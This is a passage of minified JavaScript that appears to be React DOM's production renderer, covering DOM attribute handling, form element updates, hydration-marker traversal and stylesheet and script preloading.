          _u(l, "data", a);
          break;
        }
      case "src":
      case "href":
        if (a === "" && (t !== "a" || e !== "href")) {
          l.removeAttribute(e);
          break;
        }
        if (
          a == null ||
          typeof a == "function" ||
          typeof a == "symbol" ||
          typeof a == "boolean"
        ) {
          l.removeAttribute(e);
          break;
        }
        (a = Cu("" + a)), l.setAttribute(e, a);
        break;
      case "action":
      case "formAction":
        if (typeof a == "function") {
          l.setAttribute(
            e,
            "javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')"
          );
          break;
        } else
          typeof n == "function" &&
            (e === "formAction"
              ? (t !== "input" && fl(l, t, "name", u.name, u, null),
                fl(l, t, "formEncType", u.formEncType, u, null),
                fl(l, t, "formMethod", u.formMethod, u, null),
                fl(l, t, "formTarget", u.formTarget, u, null))
              : (fl(l, t, "encType", u.encType, u, null),
                fl(l, t, "method", u.method, u, null),
                fl(l, t, "target", u.target, u, null)));
        if (a == null || typeof a == "symbol" || typeof a == "boolean") {
          l.removeAttribute(e);
          break;
        }
        (a = Cu("" + a)), l.setAttribute(e, a);
        break;
      case "onClick":
        a != null && (l.onclick = Rt);
        break;
      case "onScroll":
        a != null && W("scroll", l);
        break;
      case "onScrollEnd":
        a != null && W("scrollend", l);
        break;
      case "dangerouslySetInnerHTML":
        if (a != null) {
          if (typeof a != "object" || !("__html" in a)) throw Error(v(61));
          if (((e = a.__html), e != null)) {
            if (u.children != null) throw Error(v(60));
            l.innerHTML = e;
          }
        }
        break;
      case "multiple":
        l.multiple = a && typeof a != "function" && typeof a != "symbol";
        break;
      case "muted":
        l.muted = a && typeof a != "function" && typeof a != "symbol";
        break;
      case "suppressContentEditableWarning":
      case "suppressHydrationWarning":
      case "defaultValue":
      case "defaultChecked":
      case "innerHTML":
      case "ref":
        break;
      case "autoFocus":
        break;
      case "xlinkHref":
        if (
          a == null ||
          typeof a == "function" ||
          typeof a == "boolean" ||
          typeof a == "symbol"
        ) {
          l.removeAttribute("xlink:href");
          break;
        }
        (e = Cu("" + a)),
          l.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", e);
        break;
      case "contentEditable":
      case "spellCheck":
      case "draggable":
      case "value":
      case "autoReverse":
      case "externalResourcesRequired":
      case "focusable":
      case "preserveAlpha":
        a != null && typeof a != "function" && typeof a != "symbol"
          ? l.setAttribute(e, "" + a)
          : l.removeAttribute(e);
        break;
      case "inert":
      case "allowFullScreen":
      case "async":
      case "autoPlay":
      case "controls":
      case "default":
      case "defer":
      case "disabled":
      case "disablePictureInPicture":
      case "disableRemotePlayback":
      case "formNoValidate":
      case "hidden":
      case "loop":
      case "noModule":
      case "noValidate":
      case "open":
      case "playsInline":
      case "readOnly":
      case "required":
      case "reversed":
      case "scoped":
      case "seamless":
      case "itemScope":
        a && typeof a != "function" && typeof a != "symbol"
          ? l.setAttribute(e, "")
          : l.removeAttribute(e);
        break;
      case "capture":
      case "download":
        a === !0
          ? l.setAttribute(e, "")
          : a !== !1 &&
            a != null &&
            typeof a != "function" &&
            typeof a != "symbol"
          ? l.setAttribute(e, a)
          : l.removeAttribute(e);
        break;
      case "cols":
      case "rows":
      case "size":
      case "span":
        a != null &&
        typeof a != "function" &&
        typeof a != "symbol" &&
        !isNaN(a) &&
        1 <= a
          ? l.setAttribute(e, a)
          : l.removeAttribute(e);
        break;
      case "rowSpan":
      case "start":
        a == null || typeof a == "function" || typeof a == "symbol" || isNaN(a)
          ? l.removeAttribute(e)
          : l.setAttribute(e, a);
        break;
      case "popover":
        W("beforetoggle", l), W("toggle", l), Mu(l, "popover", a);
        break;
      case "xlinkActuate":
        Ht(l, "http://www.w3.org/1999/xlink", "xlink:actuate", a);
        break;
      case "xlinkArcrole":
        Ht(l, "http://www.w3.org/1999/xlink", "xlink:arcrole", a);
        break;
      case "xlinkRole":
        Ht(l, "http://www.w3.org/1999/xlink", "xlink:role", a);
        break;
      case "xlinkShow":
        Ht(l, "http://www.w3.org/1999/xlink", "xlink:show", a);
        break;
      case "xlinkTitle":
        Ht(l, "http://www.w3.org/1999/xlink", "xlink:title", a);
        break;
      case "xlinkType":
        Ht(l, "http://www.w3.org/1999/xlink", "xlink:type", a);
        break;
      case "xmlBase":
        Ht(l, "http://www.w3.org/XML/1998/namespace", "xml:base", a);
        break;
      case "xmlLang":
        Ht(l, "http://www.w3.org/XML/1998/namespace", "xml:lang", a);
        break;
      case "xmlSpace":
        Ht(l, "http://www.w3.org/XML/1998/namespace", "xml:space", a);
        break;
      case "is":
        Mu(l, "is", a);
        break;
      case "innerText":
      case "textContent":
        break;
      default:
        (!(2 < e.length) ||
          (e[0] !== "o" && e[0] !== "O") ||
          (e[1] !== "n" && e[1] !== "N")) &&
          ((e = J0.get(e) || e), Mu(l, e, a));
    }
  }
  function Lf(l, t, e, a, u, n) {
    switch (e) {
      case "style":
        Rc(l, a, n);
        break;
      case "dangerouslySetInnerHTML":
        if (a != null) {
          if (typeof a != "object" || !("__html" in a)) throw Error(v(61));
          if (((e = a.__html), e != null)) {
            if (u.children != null) throw Error(v(60));
            l.innerHTML = e;
          }
        }
        break;
      case "children":
        typeof a == "string"
          ? We(l, a)
          : (typeof a == "number" || typeof a == "bigint") && We(l, "" + a);
        break;
      case "onScroll":
        a != null && W("scroll", l);
        break;
      case "onScrollEnd":
        a != null && W("scrollend", l);
        break;
      case "onClick":
        a != null && (l.onclick = Rt);
        break;
      case "suppressContentEditableWarning":
      case "suppressHydrationWarning":
      case "innerHTML":
      case "ref":
        break;
      case "innerText":
      case "textContent":
        break;
      default:
        if (!Ac.hasOwnProperty(e))
          l: {
            if (
              e[0] === "o" &&
              e[1] === "n" &&
              ((u = e.endsWith("Capture")),
              (t = e.slice(2, u ? e.length - 7 : void 0)),
              (n = l[$l] || null),
              (n = n != null ? n[e] : null),
              typeof n == "function" && l.removeEventListener(t, n, u),
              typeof a == "function")
            ) {
              typeof n != "function" &&
                n !== null &&
                (e in l
                  ? (l[e] = null)
                  : l.hasAttribute(e) && l.removeAttribute(e)),
                l.addEventListener(t, a, u);
              break l;
            }
            e in l
              ? (l[e] = a)
              : a === !0
              ? l.setAttribute(e, "")
              : Mu(l, e, a);
          }
    }
  }
  function Ll(l, t, e) {
    switch (t) {
      case "div":
      case "span":
      case "svg":
      case "path":
      case "a":
      case "g":
      case "p":
      case "li":
        break;
      case "img":
        W("error", l), W("load", l);
        var a = !1,
          u = !1,
          n;
        for (n in e)
          if (e.hasOwnProperty(n)) {
            var i = e[n];
            if (i != null)
              switch (n) {
                case "src":
                  a = !0;
                  break;
                case "srcSet":
                  u = !0;
                  break;
                case "children":
                case "dangerouslySetInnerHTML":
                  throw Error(v(137, t));
                default:
                  fl(l, t, n, i, e, null);
              }
          }
        u && fl(l, t, "srcSet", e.srcSet, e, null),
          a && fl(l, t, "src", e.src, e, null);
        return;
      case "input":
        W("invalid", l);
        var f = (n = i = u = null),
          c = null,
          h = null;
        for (a in e)
          if (e.hasOwnProperty(a)) {
            var b = e[a];
            if (b != null)
              switch (a) {
                case "name":
                  u = b;
                  break;
                case "type":
                  i = b;
                  break;
                case "checked":
                  c = b;
                  break;
                case "defaultChecked":
                  h = b;
                  break;
                case "value":
                  n = b;
                  break;
                case "defaultValue":
                  f = b;
                  break;
                case "children":
                case "dangerouslySetInnerHTML":
                  if (b != null) throw Error(v(137, t));
                  break;
                default:
                  fl(l, t, a, b, e, null);
              }
          }
        Cc(l, n, f, c, h, i, u, !1);
        return;
      case "select":
        W("invalid", l), (a = i = n = null);
        for (u in e)
          if (e.hasOwnProperty(u) && ((f = e[u]), f != null))
            switch (u) {
              case "value":
                n = f;
                break;
              case "defaultValue":
                i = f;
                break;
              case "multiple":
                a = f;
              default:
                fl(l, t, u, f, e, null);
            }
        (t = n),
          (e = i),
          (l.multiple = !!a),
          t != null ? we(l, !!a, t, !1) : e != null && we(l, !!a, e, !0);
        return;
      case "textarea":
        W("invalid", l), (n = u = a = null);
        for (i in e)
          if (e.hasOwnProperty(i) && ((f = e[i]), f != null))
            switch (i) {
              case "value":
                a = f;
                break;
              case "defaultValue":
                u = f;
                break;
              case "children":
                n = f;
                break;
              case "dangerouslySetInnerHTML":
                if (f != null) throw Error(v(91));
                break;
              default:
                fl(l, t, i, f, e, null);
            }
        Uc(l, a, u, n);
        return;
      case "option":
        for (c in e)
          if (e.hasOwnProperty(c) && ((a = e[c]), a != null))
            switch (c) {
              case "selected":
                l.selected =
                  a && typeof a != "function" && typeof a != "symbol";
                break;
              default:
                fl(l, t, c, a, e, null);
            }
        return;
      case "dialog":
        W("beforetoggle", l), W("toggle", l), W("cancel", l), W("close", l);
        break;
      case "iframe":
      case "object":
        W("load", l);
        break;
      case "video":
      case "audio":
        for (a = 0; a < ou.length; a++) W(ou[a], l);
        break;
      case "image":
        W("error", l), W("load", l);
        break;
      case "details":
        W("toggle", l);
        break;
      case "embed":
      case "source":
      case "link":
        W("error", l), W("load", l);
      case "area":
      case "base":
      case "br":
      case "col":
      case "hr":
      case "keygen":
      case "meta":
      case "param":
      case "track":
      case "wbr":
      case "menuitem":
        for (h in e)
          if (e.hasOwnProperty(h) && ((a = e[h]), a != null))
            switch (h) {
              case "children":
              case "dangerouslySetInnerHTML":
                throw Error(v(137, t));
              default:
                fl(l, t, h, a, e, null);
            }
        return;
      default:
        if (li(t)) {
          for (b in e)
            e.hasOwnProperty(b) &&
              ((a = e[b]), a !== void 0 && Lf(l, t, b, a, e, void 0));
          return;
        }
    }
    for (f in e)
      e.hasOwnProperty(f) && ((a = e[f]), a != null && fl(l, t, f, a, e, null));
  }
  function br(l, t, e, a) {
    switch (t) {
      case "div":
      case "span":
      case "svg":
      case "path":
      case "a":
      case "g":
      case "p":
      case "li":
        break;
      case "input":
        var u = null,
          n = null,
          i = null,
          f = null,
          c = null,
          h = null,
          b = null;
        for (g in e) {
          var x = e[g];
          if (e.hasOwnProperty(g) && x != null)
            switch (g) {
              case "checked":
                break;
              case "value":
                break;
              case "defaultValue":
                c = x;
              default:
                a.hasOwnProperty(g) || fl(l, t, g, null, a, x);
            }
        }
        for (var m in a) {
          var g = a[m];
          if (((x = e[m]), a.hasOwnProperty(m) && (g != null || x != null)))
            switch (m) {
              case "type":
                n = g;
                break;
              case "name":
                u = g;
                break;
              case "checked":
                h = g;
                break;
              case "defaultChecked":
                b = g;
                break;
              case "value":
                i = g;
                break;
              case "defaultValue":
                f = g;
                break;
              case "children":
              case "dangerouslySetInnerHTML":
                if (g != null) throw Error(v(137, t));
                break;
              default:
                g !== x && fl(l, t, m, g, a, x);
            }
        }
        In(l, i, f, c, h, b, n, u);
        return;
      case "select":
        g = i = f = m = null;
        for (n in e)
          if (((c = e[n]), e.hasOwnProperty(n) && c != null))
            switch (n) {
              case "value":
                break;
              case "multiple":
                g = c;
              default:
                a.hasOwnProperty(n) || fl(l, t, n, null, a, c);
            }
        for (u in a)
          if (
            ((n = a[u]),
            (c = e[u]),
            a.hasOwnProperty(u) && (n != null || c != null))
          )
            switch (u) {
              case "value":
                m = n;
                break;
              case "defaultValue":
                f = n;
                break;
              case "multiple":
                i = n;
              default:
                n !== c && fl(l, t, u, n, a, c);
            }
        (t = f),
          (e = i),
          (a = g),
          m != null
            ? we(l, !!e, m, !1)
            : !!a != !!e &&
              (t != null ? we(l, !!e, t, !0) : we(l, !!e, e ? [] : "", !1));
        return;
      case "textarea":
        g = m = null;
        for (f in e)
          if (
            ((u = e[f]),
            e.hasOwnProperty(f) && u != null && !a.hasOwnProperty(f))
          )
            switch (f) {
              case "value":
                break;
              case "children":
                break;
              default:
                fl(l, t, f, null, a, u);
            }
        for (i in a)
          if (
            ((u = a[i]),
            (n = e[i]),
            a.hasOwnProperty(i) && (u != null || n != null))
          )
            switch (i) {
              case "value":
                m = u;
                break;
              case "defaultValue":
                g = u;
                break;
              case "children":
                break;
              case "dangerouslySetInnerHTML":
                if (u != null) throw Error(v(91));
                break;
              default:
                u !== n && fl(l, t, i, u, a, n);
            }
        Dc(l, m, g);
        return;
      case "option":
        for (var M in e)
          if (
            ((m = e[M]),
            e.hasOwnProperty(M) && m != null && !a.hasOwnProperty(M))
          )
            switch (M) {
              case "selected":
                l.selected = !1;
                break;
              default:
                fl(l, t, M, null, a, m);
            }
        for (c in a)
          if (
            ((m = a[c]),
            (g = e[c]),
            a.hasOwnProperty(c) && m !== g && (m != null || g != null))
          )
            switch (c) {
              case "selected":
                l.selected =
                  m && typeof m != "function" && typeof m != "symbol";
                break;
              default:
                fl(l, t, c, m, a, g);
            }
        return;
      case "img":
      case "link":
      case "area":
      case "base":
      case "br":
      case "col":
      case "embed":
      case "hr":
      case "keygen":
      case "meta":
      case "param":
      case "source":
      case "track":
      case "wbr":
      case "menuitem":
        for (var B in e)
          (m = e[B]),
            e.hasOwnProperty(B) &&
              m != null &&
              !a.hasOwnProperty(B) &&
              fl(l, t, B, null, a, m);
        for (h in a)
          if (
            ((m = a[h]),
            (g = e[h]),
            a.hasOwnProperty(h) && m !== g && (m != null || g != null))
          )
            switch (h) {
              case "children":
              case "dangerouslySetInnerHTML":
                if (m != null) throw Error(v(137, t));
                break;
              default:
                fl(l, t, h, m, a, g);
            }
        return;
      default:
        if (li(t)) {
          for (var cl in e)
            (m = e[cl]),
              e.hasOwnProperty(cl) &&
                m !== void 0 &&
                !a.hasOwnProperty(cl) &&
                Lf(l, t, cl, void 0, a, m);
          for (b in a)
            (m = a[b]),
              (g = e[b]),
              !a.hasOwnProperty(b) ||
                m === g ||
                (m === void 0 && g === void 0) ||
                Lf(l, t, b, m, a, g);
          return;
        }
    }
    for (var r in e)
      (m = e[r]),
        e.hasOwnProperty(r) &&
          m != null &&
          !a.hasOwnProperty(r) &&
          fl(l, t, r, null, a, m);
    for (x in a)
      (m = a[x]),
        (g = e[x]),
        !a.hasOwnProperty(x) ||
          m === g ||
          (m == null && g == null) ||
          fl(l, t, x, m, a, g);
  }
  function Nd(l) {
    switch (l) {
      case "css":
      case "script":
      case "font":
      case "img":
      case "image":
      case "input":
      case "link":
        return !0;
      default:
        return !1;
    }
  }
  function pr() {
    if (typeof performance.getEntriesByType == "function") {
      for (
        var l = 0, t = 0, e = performance.getEntriesByType("resource"), a = 0;
        a < e.length;
        a++
      ) {
        var u = e[a],
          n = u.transferSize,
          i = u.initiatorType,
          f = u.duration;
        if (n && f && Nd(i)) {
          for (i = 0, f = u.responseEnd, a += 1; a < e.length; a++) {
            var c = e[a],
              h = c.startTime;
            if (h > f) break;
            var b = c.transferSize,
              x = c.initiatorType;
            b &&
              Nd(x) &&
              ((c = c.responseEnd), (i += b * (c < f ? 1 : (f - h) / (c - h))));
          }
          if ((--a, (t += (8 * (n + i)) / (u.duration / 1e3)), l++, 10 < l))
            break;
        }
      }
      if (0 < l) return t / l / 1e6;
    }
    return navigator.connection &&
      ((l = navigator.connection.downlink), typeof l == "number")
      ? l
      : 5;
  }
  var Qf = null,
    Zf = null;
  function jn(l) {
    return l.nodeType === 9 ? l : l.ownerDocument;
  }
  function qd(l) {
    switch (l) {
      case "http://www.w3.org/2000/svg":
        return 1;
      case "http://www.w3.org/1998/Math/MathML":
        return 2;
      default:
        return 0;
    }
  }
  function Yd(l, t) {
    if (l === 0)
      switch (t) {
        case "svg":
          return 1;
        case "math":
          return 2;
        default:
          return 0;
      }
    return l === 1 && t === "foreignObject" ? 0 : l;
  }
  function Vf(l, t) {
    return (
      l === "textarea" ||
      l === "noscript" ||
      typeof t.children == "string" ||
      typeof t.children == "number" ||
      typeof t.children == "bigint" ||
      (typeof t.dangerouslySetInnerHTML == "object" &&
        t.dangerouslySetInnerHTML !== null &&
        t.dangerouslySetInnerHTML.__html != null)
    );
  }
  var Kf = null;
  function xr() {
    var l = window.event;
    return l && l.type === "popstate"
      ? l === Kf
        ? !1
        : ((Kf = l), !0)
      : ((Kf = null), !1);
  }
  var Gd = typeof setTimeout == "function" ? setTimeout : void 0,
    zr = typeof clearTimeout == "function" ? clearTimeout : void 0,
    Xd = typeof Promise == "function" ? Promise : void 0,
    Tr =
      typeof queueMicrotask == "function"
        ? queueMicrotask
        : typeof Xd < "u"
        ? function (l) {
            return Xd.resolve(null).then(l).catch(Er);
          }
        : Gd;
  function Er(l) {
    setTimeout(function () {
      throw l;
    });
  }
  function ge(l) {
    return l === "head";
  }
  function Ld(l, t) {
    var e = t,
      a = 0;
    do {
      var u = e.nextSibling;
      if ((l.removeChild(e), u && u.nodeType === 8))
        if (((e = u.data), e === "/$" || e === "/&")) {
          if (a === 0) {
            l.removeChild(u), Aa(t);
            return;
          }
          a--;
        } else if (
          e === "$" ||
          e === "$?" ||
          e === "$~" ||
          e === "$!" ||
          e === "&"
        )
          a++;
        else if (e === "html") ru(l.ownerDocument.documentElement);
        else if (e === "head") {
          (e = l.ownerDocument.head), ru(e);
          for (var n = e.firstChild; n; ) {
            var i = n.nextSibling,
              f = n.nodeName;
            n[Ca] ||
              f === "SCRIPT" ||
              f === "STYLE" ||
              (f === "LINK" && n.rel.toLowerCase() === "stylesheet") ||
              e.removeChild(n),
              (n = i);
          }
        } else e === "body" && ru(l.ownerDocument.body);
      e = u;
    } while (e);
    Aa(t);
  }
  function Qd(l, t) {
    var e = l;
    l = 0;
    do {
      var a = e.nextSibling;
      if (
        (e.nodeType === 1
          ? t
            ? ((e._stashedDisplay = e.style.display),
              (e.style.display = "none"))
            : ((e.style.display = e._stashedDisplay || ""),
              e.getAttribute("style") === "" && e.removeAttribute("style"))
          : e.nodeType === 3 &&
            (t
              ? ((e._stashedText = e.nodeValue), (e.nodeValue = ""))
              : (e.nodeValue = e._stashedText || "")),
        a && a.nodeType === 8)
      )
        if (((e = a.data), e === "/$")) {
          if (l === 0) break;
          l--;
        } else (e !== "$" && e !== "$?" && e !== "$~" && e !== "$!") || l++;
      e = a;
    } while (e);
  }
  function Jf(l) {
    var t = l.firstChild;
    for (t && t.nodeType === 10 && (t = t.nextSibling); t; ) {
      var e = t;
      switch (((t = t.nextSibling), e.nodeName)) {
        case "HTML":
        case "HEAD":
        case "BODY":
          Jf(e), $n(e);
          continue;
        case "SCRIPT":
        case "STYLE":
          continue;
        case "LINK":
          if (e.rel.toLowerCase() === "stylesheet") continue;
      }
      l.removeChild(e);
    }
  }
  function Ar(l, t, e, a) {
    for (; l.nodeType === 1; ) {
      var u = e;
      if (l.nodeName.toLowerCase() !== t.toLowerCase()) {
        if (!a && (l.nodeName !== "INPUT" || l.type !== "hidden")) break;
      } else if (a) {
        if (!l[Ca])
          switch (t) {
            case "meta":
              if (!l.hasAttribute("itemprop")) break;
              return l;
            case "link":
              if (
                ((n = l.getAttribute("rel")),
                n === "stylesheet" && l.hasAttribute("data-precedence"))
              )
                break;
              if (
                n !== u.rel ||
                l.getAttribute("href") !==
                  (u.href == null || u.href === "" ? null : u.href) ||
                l.getAttribute("crossorigin") !==
                  (u.crossOrigin == null ? null : u.crossOrigin) ||
                l.getAttribute("title") !== (u.title == null ? null : u.title)
              )
                break;
              return l;
            case "style":
              if (l.hasAttribute("data-precedence")) break;
              return l;
            case "script":
              if (
                ((n = l.getAttribute("src")),
                (n !== (u.src == null ? null : u.src) ||
                  l.getAttribute("type") !== (u.type == null ? null : u.type) ||
                  l.getAttribute("crossorigin") !==
                    (u.crossOrigin == null ? null : u.crossOrigin)) &&
                  n &&
                  l.hasAttribute("async") &&
                  !l.hasAttribute("itemprop"))
              )
                break;
              return l;
            default:
              return l;
          }
      } else if (t === "input" && l.type === "hidden") {
        var n = u.name == null ? null : "" + u.name;
        if (u.type === "hidden" && l.getAttribute("name") === n) return l;
      } else return l;
      if (((l = Tt(l.nextSibling)), l === null)) break;
    }
    return null;
  }
  function jr(l, t, e) {
    if (t === "") return null;
    for (; l.nodeType !== 3; )
      if (
        ((l.nodeType !== 1 || l.nodeName !== "INPUT" || l.type !== "hidden") &&
          !e) ||
        ((l = Tt(l.nextSibling)), l === null)
      )
        return null;
    return l;
  }
  function Zd(l, t) {
    for (; l.nodeType !== 8; )
      if (
        ((l.nodeType !== 1 || l.nodeName !== "INPUT" || l.type !== "hidden") &&
          !t) ||
        ((l = Tt(l.nextSibling)), l === null)
      )
        return null;
    return l;
  }
  function wf(l) {
    return l.data === "$?" || l.data === "$~";
  }
  function Wf(l) {
    return (
      l.data === "$!" ||
      (l.data === "$?" && l.ownerDocument.readyState !== "loading")
    );
  }
  function Mr(l, t) {
    var e = l.ownerDocument;
    if (l.data === "$~") l._reactRetry = t;
    else if (l.data !== "$?" || e.readyState !== "loading") t();
    else {
      var a = function () {
        t(), e.removeEventListener("DOMContentLoaded", a);
      };
      e.addEventListener("DOMContentLoaded", a), (l._reactRetry = a);
    }
  }
  function Tt(l) {
    for (; l != null; l = l.nextSibling) {
      var t = l.nodeType;
      if (t === 1 || t === 3) break;
      if (t === 8) {
        if (
          ((t = l.data),
          t === "$" ||
            t === "$!" ||
            t === "$?" ||
            t === "$~" ||
            t === "&" ||
            t === "F!" ||
            t === "F")
        )
          break;
        if (t === "/$" || t === "/&") return null;
      }
    }
    return l;
  }
  var kf = null;
  function Vd(l) {
    l = l.nextSibling;
    for (var t = 0; l; ) {
      if (l.nodeType === 8) {
        var e = l.data;
        if (e === "/$" || e === "/&") {
          if (t === 0) return Tt(l.nextSibling);
          t--;
        } else
          (e !== "$" && e !== "$!" && e !== "$?" && e !== "$~" && e !== "&") ||
            t++;
      }
      l = l.nextSibling;
    }
    return null;
  }
  function Kd(l) {
    l = l.previousSibling;
    for (var t = 0; l; ) {
      if (l.nodeType === 8) {
        var e = l.data;
        if (e === "$" || e === "$!" || e === "$?" || e === "$~" || e === "&") {
          if (t === 0) return l;
          t--;
        } else (e !== "/$" && e !== "/&") || t++;
      }
      l = l.previousSibling;
    }
    return null;
  }
  function Jd(l, t, e) {
    switch (((t = jn(e)), l)) {
      case "html":
        if (((l = t.documentElement), !l)) throw Error(v(452));
        return l;
      case "head":
        if (((l = t.head), !l)) throw Error(v(453));
        return l;
      case "body":
        if (((l = t.body), !l)) throw Error(v(454));
        return l;
      default:
        throw Error(v(451));
    }
  }
  function ru(l) {
    for (var t = l.attributes; t.length; ) l.removeAttributeNode(t[0]);
    $n(l);
  }
  var Et = new Map(),
    wd = new Set();
  function Mn(l) {
    return typeof l.getRootNode == "function"
      ? l.getRootNode()
      : l.nodeType === 9
      ? l
      : l.ownerDocument;
  }
  var $t = A.d;
  A.d = { f: _r, r: Or, D: Cr, C: Dr, L: Ur, m: Hr, X: Br, S: Rr, M: Nr };
  function _r() {
    var l = $t.f(),
      t = Sn();
    return l || t;
  }
  function Or(l) {
    var t = Ve(l);
    t !== null && t.tag === 5 && t.type === "form" ? so(t) : $t.r(l);
  }
  var za = typeof document > "u" ? null : document;
  function Wd(l, t, e) {
    var a = za;
    if (a && typeof t == "string" && t) {
      var u = mt(t);
      (u = 'link[rel="' + l + '"][href="' + u + '"]'),
        typeof e == "string" && (u += '[crossorigin="' + e + '"]'),
        wd.has(u) ||
          (wd.add(u),
          (l = { rel: l, crossOrigin: e, href: t }),
          a.querySelector(u) === null &&
            ((t = a.createElement("link")),
            Ll(t, "link", l),
            Dl(t),
            a.head.appendChild(t)));
    }
  }
  function Cr(l) {
    $t.D(l), Wd("dns-prefetch", l, null);
  }
  function Dr(l, t) {
    $t.C(l, t), Wd("preconnect", l, t);
  }
  function Ur(l, t, e) {
    $t.L(l, t, e);
    var a = za;
    if (a && l && t) {
      var u = 'link[rel="preload"][as="' + mt(t) + '"]';
      t === "image" && e && e.imageSrcSet
        ? ((u += '[imagesrcset="' + mt(e.imageSrcSet) + '"]'),
          typeof e.imageSizes == "string" &&
            (u += '[imagesizes="' + mt(e.imageSizes) + '"]'))
        : (u += '[href="' + mt(l) + '"]');
      var n = u;
      switch (t) {
        case "style":
          n = Ta(l);
          break;
        case "script":
          n = Ea(l);
      }
      Et.has(n) ||
        ((l = R(
          {
            rel: "preload",
            href: t === "image" && e && e.imageSrcSet ? void 0 : l,
            as: t,
          },
          e
        )),
        Et.set(n, l),
        a.querySelector(u) !== null ||
          (t === "style" && a.querySelector(yu(n))) ||
          (t === "script" && a.querySelector(hu(n))) ||
          ((t = a.createElement("link")),
          Ll(t, "link", l),
          Dl(t),
          a.head.appendChild(t)));
    }
  }
  function Hr(l, t) {
    $t.m(l, t);
    var e = za;
    if (e && l) {
      var a = t && typeof t.as == "string" ? t.as : "script",
        u =
          'link[rel="modulepreload"][as="' + mt(a) + '"][href="' + mt(l) + '"]',
        n = u;
      switch (a) {
        case "audioworklet":
        case "paintworklet":
        case "serviceworker":
        case "sharedworker":
        case "worker":
        case "script":
          n = Ea(l);
      }
      if (
        !Et.has(n) &&
        ((l = R({ rel: "modulepreload", href: l }, t)),
        Et.set(n, l),
        e.querySelector(u) === null)
      ) {
        switch (a) {
          case "audioworklet":
          case "paintworklet":
          case "serviceworker":
          case "sharedworker":
          case "worker":
          case "script":
            if (e.querySelector(hu(n))) return;
        }
        (a = e.createElement("link")),
          Ll(a, "link", l),
          Dl(a),
          e.head.appendChild(a);
      }
    }
  }
  function Rr(l, t, e) {
    $t.S(l, t, e);
    var a = za;
    if (a && l) {
      var u = Ke(a).hoistableStyles,
        n = Ta(l);
      t = t || "default";
      var i = u.get(n);
      if (!i) {
        var f = { loading: 0, preload: null };
        if ((i = a.querySelector(yu(n)))) f.loading = 5;
        else {
          (l = R({ rel: "stylesheet", href: l, "data-precedence": t }, e)),
            (e = Et.get(n)) && $f(l, e);
          var c = (i = a.createElement("link"));
          Dl(c),
            Ll(c, "link", l),
            (c._p = new Promise(function (h, b) {
              (c.onload = h), (c.onerror = b);
            })),
            c.addEventListener("load", function () {
              f.loading |= 1;
            }),
            c.addEventListener("error", function () {
              f.loading |= 2;
            }),
            (f.loading |= 4),
            _n(i, t, a);
        }
        (i = { type: "stylesheet", instance: i, count: 1, state: f }),
          u.set(n, i);
      }
    }
  }
  function Br(l, t) {
    $t.X(l, t);
    var e = za;
    if (e && l) {
      var a = Ke(e).hoistableScripts,
        u = Ea(l),
        n = a.get(u);
      n ||
        ((n = e.querySelector(hu(u))),
        n ||
          ((l = R({ src: l, async: !0 }, t)),
          (t = Et.get(u)) && Ff(l, t),
          (n = e.createElement("script")),
          Dl(n),
          Ll(n, "link", l),
          e.head.appendChild(n)),
        (n = { type: "script", instance: n, count: 1, state: null }),
        a.set(u, n));
    }
  }
  function Nr(l, t) {
    $t.M(l, t);
    var e = za;
    if (e && l) {
      var a = Ke(e).hoistableScripts,
        u = Ea(l),
        n = a.get(u);
      n ||
        ((n = e.querySelector(hu(u))),
        n ||
          ((l = R({ src: l, async: !0, type: "module" }, t)),
          (t = Et.get(u)) && Ff(l, t),
          (n = e.createElement("script")),
          Dl(n),
          Ll(n, "link", l),
          e.head.appendChild(n)),
        (n = { type: "script", instance: n, count: 1, state: null }),
        a.set(u, n));
    }
  }
  function kd(l, t, e, a) {
    var u = (u = J.current) ? Mn(u) : null;
    if (!u) throw Error(v(446));
    switch (l) {
      case "meta":
      case "title":
        return null;
      case "style":
        return typeof e.precedence == "string" && typeof e.href == "string"
          ? ((t = Ta(e.href)),
            (e = Ke(u).hoistableStyles),
            (a = e.get(t)),
            a ||
              ((a = { type: "style", instance: null, count: 0, state: null }),
              e.set(t, a)),
            a)
          : { type: "void", instance: null, count: 0, state: null };
      case "link":
        if (
          e.rel === "stylesheet" &&
          typeof e.href == "string" &&
          typeof e.precedence == "string"
        ) {
          l = Ta(e.href);
          var n = Ke(u).hoistableStyles,
            i = n.get(l);
          if (
            (i ||
              ((u = u.ownerDocument || u),
              (i = {
                type: "stylesheet",
                instance: null,
                count: 0,
                state: { loading: 0, preload: null },
              }),
              n.set(l, i),
              (n = u.querySelector(yu(l))) &&
                !n._p &&
                ((i.instance = n), (i.state.loading = 5)),
              Et.has(l) ||
                ((e = {
                  rel: "preload",
                  as: "style",
                  href: e.href,
                  crossOrigin: e.crossOrigin,
                  integrity: e.integrity,
                  media: e.media,
                  hrefLang: e.hrefLang,
                  referrerPolicy: e.referrerPolicy,
                }),
                Et.set(l, e),
                n || qr(u, l, e, i.state))),
            t && a === null)
          )
            throw Error(v(528, ""));
          return i;
        }
        if (t && a !== null) throw Error(v(529, ""));
        return null;
      case "script":
        return (
          (t = e.async),
          (e = e.src),
          typeof e == "string" &&
          t &&
          typeof t != "function" &&
          typeof t != "symbol"
            ? ((t = Ea(e)),
              (e = Ke(u).hoistableScripts),
              (a = e.get(t)),
              a ||
                ((a = {
                  type: "script",
                  instance: null,
                  count: 0,
                  state: null,
                }),
                e.set(t, a)),
              a)
            : { type: "void", instance: null, count: 0, state: null }
        );
      default:
        throw Error(v(444, l));
    }
  }
  function Ta(l) {
    return 'href="' + mt(l) + '"';
  }
  function yu(l) {
    return 'link[rel="stylesheet"][' + l + "]";
  }
  function $d(l) {
    return R({}, l, { "data-precedence": l.precedence, precedence: null });
  }
  function qr(l, t, e, a) {
    l.querySelector('link[rel="preload"][as="style"][' + t + "]")
      ? (a.loading = 1)
      : ((t = l.createElement("link")),
        (a.preload = t),
        t.addEventListener("load", function () {
          return (a.loading |= 1);
        }),
        t.addEventListener("error", function () {
          return (a.loading |= 2);
        }),
        Ll(t, "link", e),
        Dl(t),
        l.head.appendChild(t));
  }
  function Ea(l) {
    return '[src="' + mt(l) + '"]';
  }
  function hu(l) {
    return "script[async]" + l;
  }
  function Fd(l, t, e) {
    if ((t.count++, t.instance === null))
      switch (t.type) {
        case "style":
          var a = l.querySelector('style[data-href~="' + mt(e.href) + '"]');
          if (a) return (t.instance = a), Dl(a), a;
          var u = R({}, e, {
            "data-href": e.href,
            "data-precedence": e.precedence,
